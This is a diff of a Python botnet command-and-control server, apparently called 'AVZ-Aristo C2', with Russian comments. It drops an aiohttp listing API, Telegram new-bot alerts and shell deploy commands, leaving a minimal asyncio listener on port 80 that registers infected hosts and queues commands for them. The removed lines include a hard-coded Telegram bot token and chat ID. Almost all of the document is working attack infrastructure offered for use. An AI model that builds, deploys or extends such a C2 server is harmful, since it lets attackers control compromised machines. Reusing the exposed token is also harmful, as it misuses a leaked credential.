@@ -1,26 +1,11 @@
-cat > /root/c2/botnet/c2.py << 'EOF'
 #!/usr/bin/env python3
+# AVZ-Aristo C2 – сверхминимальный, без внешних зависимостей
 import asyncio, json, os, time
 from datetime import datetime
-from aiohttp import web
 
 HTTP_PORT = 80
-API_PORT = 8080
 BOTS_FILE = "bots.json"
 COMMANDS_FILE = "commands.json"
-
-TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
-TELEGRAM_CHAT_ID = "2119367196"
-
-def telegram_notify(msg):
-    if not (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID):
-        return
-    try:
-        import requests
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                      json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
-    except:
-        pass
 
 bots = {}
 if os.path.exists(BOTS_FILE):
@@ -40,7 +25,7 @@ def save_commands():
     with open(COMMANDS_FILE, "w") as f:
         json.dump(commands_queue, f, indent=2)
 
-async def handle_tcp(reader, writer):
+async def handle_client(reader, writer):
     ip = writer.get_extra_info('peername')[0]
     try:
         data = await asyncio.wait_for(reader.read(4096), timeout=5)
@@ -94,6 +79,7 @@ async def handle_tcp(reader, writer):
             bots[ip]["status"] = "online"
             save_bots()
     else:
+        # Регистрация нового бота
         info = {}
         try:
             data = json.loads(msg)
@@ -120,32 +106,17 @@ async def handle_tcp(reader, writer):
         }
         save_bots()
         if is_new:
-            telegram_notify(f"🟢 Новый бот: {ip} ({hostname})")
+            # Можно добавить уведомление в Telegram, но сейчас для простоты пропущено
+            pass
         writer.write(b"registered")
     await writer.drain()
     writer.close()
 
-async def start_tcp():
-    server = await asyncio.start_server(handle_tcp, '0.0.0.0', HTTP_PORT)
-    print(f"[+] TCP C2 на порту {HTTP_PORT}")
+async def main():
+    server = await asyncio.start_server(handle_client, '0.0.0.0', HTTP_PORT)
+    print(f"[+] C2 (чистый asyncio) слушает порт {HTTP_PORT}")
     async with server:
         await server.serve_forever()
 
-async def main():
-    tcp = asyncio.create_task(start_tcp())
-    app = web.Application()
-    app.router.add_get('/list', lambda r: web.json_response(list(bots.values())))
-    runner = web.AppRunner(app)
-    await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', API_PORT)
-    await site.start()
-    print(f"[+] HTTP API на порту {API_PORT}")
-    await tcp
-
 if __name__ == "__main__":
     asyncio.run(main())
-EOF
-
-pkill -9 -f botnet/c2.py
-screen -dmS c2 python3 /root/c2/botnet/c2.py
-sleep 2 && ss -tlnp | grep 80
